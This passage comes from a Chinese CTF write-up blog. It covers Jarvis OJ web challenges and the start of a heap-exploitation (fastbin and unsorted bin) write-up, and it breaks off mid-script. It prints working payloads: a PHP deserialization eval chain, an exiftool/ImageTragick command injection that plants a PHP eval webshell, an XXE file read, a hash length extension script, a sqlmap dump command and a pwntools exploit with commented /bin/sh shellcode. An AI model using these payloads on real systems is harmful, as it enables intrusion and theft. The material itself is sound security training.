class="number">238</span>, <span class="number">170</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">150</span>, <span class="number">161</span>, <span class="number">249</span>, <span class="number">236</span>], [<span class="number">251</span>, <span class="number">96</span>, <span class="number">103</span>, <span class="number">188</span>, <span class="number">188</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">237</span>, <span class="number">63</span>, <span class="number">230</span>, <span class="number">128</span>, <span class="number">166</span>, <span class="number">130</span>, <span class="number">141</span>, <span class="number">112</span>, <span class="number">254</span>, <span class="number">234</span>, <span class="number">113</span>, <span class="number">250</span>, <span class="number">1</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">135</span>, <span class="number">119</span>], [<span class="number">192</span>, <span class="number">206</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">174</span>, <span class="number">130</span>, <span class="number">164</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">153</span>, <span class="number">82</span>, <span class="number">254</span>, <span class="number">20</span>, <span class="number">133</span>, <span class="number">56</span>, <span class="number">7</span>, <span class="number">163</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">204</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">196</span>], [<span class="number">106</span>, <span class="number">63</span>, <span class="number">252</span>, <span class="number">202</span>, <span class="number">153</span>, <span class="number">6</span>, <span class="number">193</span>, <span class="number">146</span>, <span class="number">88</span>, <span class="number">118</span>, <span class="number">78</span>, <span class="number">58</span>, <span class="number">214</span>, <span class="number">168</span>, <span class="number">68</span>, <span class="number">128</span>, <span class="number">68</span>, <span class="number">35</span>, <span class="number">245</span>, <span class="number">144</span>, <span class="number">102</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">207</span>, <span class="number">66</span>], [<span class="number">154</span>, <span class="number">98</span>, <span class="number">219</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">131</span>, <span class="number">185</span>, <span class="number">27</span>, <span class="number">162</span>, <span class="number">214</span>, <span class="number">63</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">38</span>, <span class="number">129</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">78</span>, <span class="number">121</span>, <span class="number">55</span>, <span class="number">214</span>], [<span class="number">193</span>, <span class="number">94</span>, <span class="number">107</span>, <span class="number">45</span>, <span class="number">83</span>, <span class="number">56</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">169</span>, <span class="number">120</span>, <span class="number">58</span>, <span class="number">105</span>, <span class="number">178</span>, <span class="number">58</span>, <span class="number">217</span>, <span class="number">18</span>, <span class="number">93</span>, <span class="number">212</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">219</span>, <span class="number">89</span>, <span class="number">212</span>], [<span class="number">164</span>, <span class="number">228</span>, <span class="number">5</span>, <span class="number">133</span>, <span class="number">175</span>, <span class="number">164</span>, <span class="number">37</span>, <span class="number">176</span>, <span class="number">94</span>, <span class="number">232</span>, <span class="number">82</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">212</span>, <span class="number">107</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">153</span>, <span class="number">119</span>, <span class="number">85</span>, <span class="number">147</span>, <span class="number">256</span>, <span class="number">130</span>, <span class="number">248</span>, <span class="number">235</span>], [<span class="number">221</span>, <span class="number">178</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">215</span>, <span class="number">200</span>, <span class="number">188</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">172</span>, <span class="number">133</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">215</span>, <span class="number">204</span>, <span class="number">141</span>, <span class="number">226</span>, <span class="number">118</span>, <span class="number">233</span>, <span class="number">156</span>], [<span class="number">236</span>, <span class="number">142</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">134</span>, <span class="number">54</span>, <span class="number">239</span>, <span class="number">49</span>, <span class="number">220</span>, <span class="number">233</span>, <span class="number">216</span>, <span class="number">13</span>, <span class="number">143</span>, <span class="number">145</span>, <span class="number">112</span>, <span class="number">217</span>, <span class="number">194</span>, <span class="number">114</span>, <span class="number">221</span>, <span class="number">150</span>, <span class="number">51</span>, <span class="number">136</span>, <span class="number">31</span>, <span class="number">198</span>]]</div><div class="line">r = [<span class="number">325799</span>, <span class="number">309234</span>, <span class="number">317320</span>, <span class="number">327895</span>, <span class="number">298316</span>, <span class="number">301249</span>, <span class="number">330242</span>, <span class="number">289290</span>, <span class="number">273446</span>, <span class="number">337687</span>, <span class="number">258725</span>, <span class="number">267444</span>, <span class="number">373557</span>, <span class="number">322237</span>, <span class="number">344478</span>, <span class="number">362136</span>, <span class="number">331815</span>, <span class="number">315157</span>, <span class="number">299242</span>, <span class="number">305418</span>, <span class="number">313569</span>, <span class="number">269307</span>, <span class="number">338319</span>, <span class="number">306491</span>, <span class="number">351259</span>]</div><div class="line">o = np.array(o)</div><div class="line">r = np.array(r)</div><div class="line">x = np.linalg.solve(o,r)</div><div class="line"><span class="keyword">print</span> x</div><div class="line">string = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</div><div class="line">    string += chr(int(str(i)[<span class="number">0</span>:<span class="number">-2</span>]))</div><div class="line"><span class="keyword">print</span> string</div></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>反序列化漏洞，比较新的一点是利用了php upload过程中的session来进行漏洞利用。</p>
<p>html构造如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/phpinfo.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</div><div class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</div><div class="line">    &lt;input type=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>
<p>几个payload </p>
<p><code>print_r(dirname(__FILE__));</code><br><code>print_r(scandir(dirname(__FILE__)));</code><br><code>print_r(file_get_contents(&quot;Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code><br>序列化payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</div><div class="line">session_start();</div><div class="line">class OowoO</div><div class="line">&#123;</div><div class="line">    public $mdzz;</div><div class="line">    function __construct()</div><div class="line">    &#123;</div><div class="line">        $this-&gt;mdzz = &apos;phpinfo();&apos;;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    function __destruct()</div><div class="line">    &#123;</div><div class="line">        eval($this-&gt;mdzz);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$m = new OowoO();</div><div class="line">$m-&gt;mdzz = &quot;print_r(dirname(__FILE__));&quot;; </div><div class="line"></div><div class="line">echo serialize($m);</div><div class="line">//O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(__FILE__));&quot;;&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>ps: </p>
<p>参考资料<br>PHP Session 序列化及反序列化处理器 <a href="http://www.tuicool.com/articles/zEfuEz" target="_blank" rel="external">http://www.tuicool.com/articles/zEfuEz</a></p>
<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>cve漏洞 imagick</p>
<p><code>exiftool -label=&quot;\&quot;|/usr/bin/id; \&quot;&quot; imagick.png</code></p>
<p>shell</p>
<p><code>exiftool -label=&quot;\&quot;|/bin/echo \&lt;?php \@eval\(\\$\_POST\[a\]\)\;?\&gt; &gt; /opt/lampp/htdocs/uploads/1.php; \&quot;&quot; imagick.png</code></p>
<p><code>CTF{873dfee87823248f4a1657650204697a}</code></p>
<h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><p>一开始一脸懵比。。。</p>
<p>原来是XXE攻击</p>
<p>payload一发带走</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;</div><div class="line">&lt;root&gt;</div><div class="line">&lt;search&gt;name&lt;/search&gt;</div><div class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</div><div class="line">&lt;/root&gt;</div></pre></td></tr></table></figure>
<h3 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h3><p>考点：文件包含漏洞</p>
<p>1、泄露源码</p>
<p>但是关键字符被waf挡住了。</p>
<p>上传图片马</p>
<p><code>uploads/1497485980.gif</code></p>
<p>还是被waf拦截了，使用<code>&lt;script&gt;</code>绕过</p>
<p><code>CTF{upl0ad_sh0uld_n07_b3_a110wed}</code></p>
<h3 id="chopper"><a href="#chopper" class="headerlink" title="chopper"></a>chopper</h3><p>考察点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">X-Originating-IP: 127.0.0.1</div><div class="line">X-Forwarded-For: 127.0.0.1</div><div class="line">X-Remote-IP: 127.0.0.1</div><div class="line">X-Remote-Addr: 127.0.0.1</div><div class="line">X-Client-IP: 127.0.0.1</div></pre></td></tr></table></figure></p>
<p>ssrf中ip.src的构建。</p>
<p>信息获取能力</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">robots.txt</div><div class="line">.index.php.swp</div><div class="line">.index.php.swo</div><div class="line">index.txt</div><div class="line">index.bak</div><div class="line">index.php~</div><div class="line">test.php</div><div class="line">index.phps</div><div class="line">phpinfo.php</div></pre></td></tr></table></figure>
<p>在robots.txt中找到线索。在burp repeater中，change action method 使get变成post，成功执行。</p>
<p><code>CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}</code></p>
<h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>考察点：</p>
<p>信息获取能力</p>
<p>vim缓存文件恢复 <code>vim -r index.php</code></p>
<p>哈希长度扩展攻击</p>
<p>可利用工具：</p>
<p><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="external">https://github.com/iagox86/hash_extender</a></p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests,os,urllib</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">	cmd = <span class="string">'./hash_extender -d ";\\"tseug\\":5:s" -s "3a4727d57463f122833d9e732f94e4e0" -a ";\\"nimda\\":5:s"  -f md5 --out-data-format=html -q -l '</span>+str(x)</div><div class="line">	<span class="comment"># print cmd</span></div><div class="line">	p = os.popen(cmd).read()</div><div class="line">	<span class="comment"># break</span></div><div class="line">	url = <span class="string">"http://web.jarvisoj.com:32778/"</span></div><div class="line">	payload = <span class="string">"__cfduid=d08f46c0f9fbc7e86bab05b2d091bb7c81496549709; UM_distinctid=15c715066e3a8a-0f985be0b8ac06-5393662-1fa400-15c715066e4104b; "</span></div><div class="line">	payload += <span class="string">"hsh="</span>+p[:<span class="number">32</span>]+<span class="string">";"</span></div><div class="line"></div><div class="line">	payload +=<span class="string">"role="</span>+urllib.quote(urllib.unquote(p[<span class="number">32</span>:])[::<span class="number">-1</span>])+<span class="string">";"</span></div><div class="line">	<span class="comment"># print payload</span></div><div class="line">	<span class="comment"># break</span></div><div class="line">	head = &#123;<span class="string">"Cookie"</span>:payload&#125;</div><div class="line"></div><div class="line"></div><div class="line">	data = requests.get(url=url,headers=head).content</div><div class="line">	<span class="keyword">if</span> len(data) != <span class="number">210</span>:</div><div class="line">		<span class="keyword">print</span> data</div></pre></td></tr></table></figure>
<p>参考资料：</p>
<p><a href="https://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90" target="_blank" rel="external">https://ricterz.me/posts/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90</a></p>
<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><p>逆向思路。。gdb调试一波，拿到flag。。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;dlfcn.h&gt;</div><div class="line"></div><div class="line">//动态链接库路径</div><div class="line">#define LIB_CACULATE_PATH &quot;./udf.so&quot;</div><div class="line"></div><div class="line">//函数指针</div><div class="line">typedef int (*CAC_FUNC)();</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    void *handle;</div><div class="line">    char *error;</div><div class="line">    CAC_FUNC cac_func = NULL;</div><div class="line"></div><div class="line">    //打开动态链接库</div><div class="line">    handle = dlopen(LIB_CACULATE_PATH, RTLD_LAZY);</div><div class="line">    if (!handle) &#123;</div><div class="line">    fprintf(stderr, &quot;%s\n&quot;, dlerror());</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    //清除之前存在的错误</div><div class="line">    dlerror();</div><div class="line"></div><div class="line">    //获取一个函数</div><div class="line">    *(void **) (&amp;cac_func) = dlsym(handle, &quot;getflag&quot;);</div><div class="line">    if ((error = dlerror()) != NULL)  &#123;</div><div class="line">    fprintf(stderr, &quot;%s\n&quot;, error);</div><div class="line">    exit(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line">    (*cac_func)();</div><div class="line">    dlclose(handle);</div><div class="line">    exit(EXIT_SUCCESS);</div><div class="line">&#125;</div><div class="line"></div><div class="line">gcc -rdynamic -o main main.c -ldl</div></pre></td></tr></table></figure>
<h3 id="simple-injection"><a href="#simple-injection" class="headerlink" title="simple injection"></a>simple injection</h3><p><code>sqlmap -u &quot;http://web.jarvisoj.com:32787/login.php&quot; --data &quot;username=123&amp;password=123&quot; --tamper=space2comment -D injection --dump</code></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【pwn】cuit2017 & 0ctf2017 heap总结]]></title>
      <url>/2017/06/04/heap-all/</url>
      <content type="html"><![CDATA[<h3 id="涉及到的知识点"><a href="#涉及到的知识点" class="headerlink" title="涉及到的知识点"></a>涉及到的知识点</h3><p>1、fastbin attack</p>
<p>2、unsorted bin attack</p>
<p>3、malloc堆内存管理</p>
<a id="more"></a>
<h3 id="一些记录"><a href="#一些记录" class="headerlink" title="一些记录"></a>一些记录</h3><p>当我们用malloc申请一个0x20的空间的时候，glibc实际上给予了我们一个如下这样子的一个结构。</p>
<p>|head(0x8/0x10)|data(0x20)|</p>
<p><strong>注意：由于x84和x64的机器字长不一样，故其head头部大小也不一样，x86为0x8长度，x64为0x10长度。</strong></p>
<p>data区域是我们可以进行数据输入的区间，malloc返回的指针便是该区间的首地址，记作PTR</p>
<p>当我们free它的时候，它会判定是否与top chunk相邻，如果相邻，它将会与top chunk合并，如果不是的话，它会进一步判断自身大小是否满足fast bin的要求，fastbin的边界大小由 libc内的全局变量fast_max决定，不过x86下这个值为0x40，x64下位0x80，小于等于这个值的所有chunk，free后将有fast bin管理，如果该chunk可以重复free，我们则可以利用fast bin attack来实现<strong>有限制的地址写能力</strong>（<a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c</a> ）。而如果边界的大小大于fastbin的边界大小，该chunk则会加入到unsorted bin中去，此时我们可以修改bk来实现unsorted attack （ <a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c</a> ）如果free 一个small/large chunk 的时候，可以修改本chunk、前一个或后一个，small/large chunk的head and data，则可以进行double free攻击。（ <a href="http://www.hackdig.com/08/hack-25191.htm" target="_blank" rel="external">http://www.hackdig.com/08/hack-25191.htm</a>  ）</p>
<h3 id="cuit2017-pwn400"><a href="#cuit2017-pwn400" class="headerlink" title="cuit2017 pwn400"></a>cuit2017 pwn400</h3><p>题目可以从我github上下载。</p>
<p>hint：ubuntu 16.04</p>
<p>本题利用方式为：fast bin attack 覆盖name变量实现信息泄露。  overlap chunk attack 实现 hijack fsp attack，最终修改vtable至onegadget 或者system 实现get shell。</p>
<p>注意点：x64下面 0x220为vtable偏移量。x86么。。还没测ORZ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-05-27 21:28:47</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./pwn400"</span></div><div class="line">remote_ip = <span class="string">"119.29.87.226"</span></div><div class="line">port =  <span class="number">50004</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line">elf = ELF(target)</div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># 	p = process(target)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	p.recvuntil("input:")</span></div><div class="line"><span class="comment"># 	p.sendline(payload)</span></div><div class="line"><span class="comment"># 	return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># 	sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line">	</div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,sec)</span>:</span></div><div class="line">	ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">	sl(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(name)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(sec)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(sec)</span>:</span></div><div class="line">	ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">	sl(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(sec)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">	sl(<span class="string">"3"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">	sl(<span class="string">"4"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(data1,data2)</span>:</span></div><div class="line">	ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">	sl(<span class="string">"5"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(<span class="string">"Y"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(data1)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(data2)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(size,title,advise)</span>:</span></div><div class="line">	ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">	sl(<span class="string">"6"</span>)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sl(str(size))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(title)</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(advise)</div><div class="line"></div><div class="line"><span class="comment">#save(0x28,"a"*0x28+p64(0x21),"a"*0x18)</span></div><div class="line"></div><div class="line">add(<span class="string">"a"</span>*<span class="number">8</span>+p64(<span class="number">0x21</span>)+<span class="string">"\n"</span>,<span class="string">"1\n"</span>)</div><div class="line"></div><div class="line">dele()</div><div class="line">edit(str(<span class="number">0x6020c0</span>).rjust(<span class="number">7</span>,<span class="string">"0"</span>)+<span class="string">"\n"</span>)</div><div class="line">submit(<span class="string">"a"</span>*<span class="number">0x17</span>+<span class="string">"\x00\n"</span>,<span class="string">"a"</span>*<span class="number">0x8</span>+p64(elf.got[<span class="string">"alarm"</span>])+<span class="string">"\n"</span>)</div><div class="line"><span class="comment">##leak (- limit :(</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"9"</span>)</div><div class="line"></div><div class="line">alarm_addr = u64(ru(<span class="string">",You"</span>)[<span class="number">5</span>:<span class="number">-4</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">libc_base = alarm_addr-libc.symbols[<span class="string">"alarm"</span>]</div><div class="line">one_gadget = libc_base + <span class="number">0xf5e40</span></div><div class="line">bin_sh = libc_base+next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line">system_addr = 